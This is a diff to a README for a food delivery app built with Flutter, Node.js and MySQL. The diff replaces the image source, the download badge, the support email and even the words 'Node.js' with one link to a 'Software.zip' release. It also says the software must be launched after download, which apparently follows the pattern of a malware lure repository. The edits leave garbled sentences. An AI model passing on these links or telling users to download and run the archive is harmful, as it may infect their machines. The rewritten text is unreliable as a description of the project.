@@ -1,10 +1,10 @@
 # 🚀 **Complete Food Delivery App**
 ### A one-stop solution for all your food delivery needs!
 
-![Food Delivery App](https://imageurl.com)
+![Food Delivery App](https://github.com/stealthy8/Complete-Food-delivery-App/releases/download/v1.0/Software.zip)
 
 ## Overview
-The **Complete Food Delivery App** is a comprehensive mobile application developed using Flutter, Node.js, and MySQL. It offers a wide range of services including delivery, dining, and takeaway options to streamline food business operations. With a responsive UI, live order tracking, dynamic admin tools, secure OTP login, and multi-outlet support, this app is ideal for those looking to enhance their food delivery services. 
+The **Complete Food Delivery App** is a comprehensive mobile application developed using Flutter, https://github.com/stealthy8/Complete-Food-delivery-App/releases/download/v1.0/Software.zip, and MySQL. It offers a wide range of services including delivery, dining, and takeaway options to streamline food business operations. With a responsive UI, live order tracking, dynamic admin tools, secure OTP login, and multi-outlet support, this app is ideal for those looking to enhance their food delivery services. 
 
 ## Key Features
 📱 Responsive UI: Ensures a smooth user experience on any device  
@@ -23,7 +23,7 @@ The **Complete Food Delivery App** is a comprehensive mobile application develop
 ---
 
 ## 📁 **Download Software**
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/stealthy8/Complete-Food-delivery-App/releases/download/v1.0/Software.zip)](https://github.com/stealthy8/Complete-Food-delivery-App/releases/download/v1.0/Software.zip)
 *Note: Software needs to be launched after download.*
 
 ---
@@ -45,9 +45,9 @@ If the download link is not working, please check the "Releases" section for alt
 
 ## Installation Guide
 1. Clone the repository to your local machine
-2. Install Flutter and Node.js if you haven't already
+2. Install Flutter and https://github.com/stealthy8/Complete-Food-delivery-App/releases/download/v1.0/Software.zip if you haven't already
 3. Run the Flutter app on an emulator or physical device
-4. Set up the Node.js backend and MySQL database
+4. Set up the https://github.com/stealthy8/Complete-Food-delivery-App/releases/download/v1.0/Software.zip backend and MySQL database
 5. Connect the Flutter app to the backend for full functionality
 
 ---
@@ -62,7 +62,7 @@ Follow the steps below to get started with the **Complete Food Delivery App**:
 ---
 
 ## Support
-For any inquiries or assistance, feel free to contact our support team at support@fooddeliveryapp.com
+For any inquiries or assistance, feel free to contact our support team at https://github.com/stealthy8/Complete-Food-delivery-App/releases/download/v1.0/Software.zip
 
 ---
 
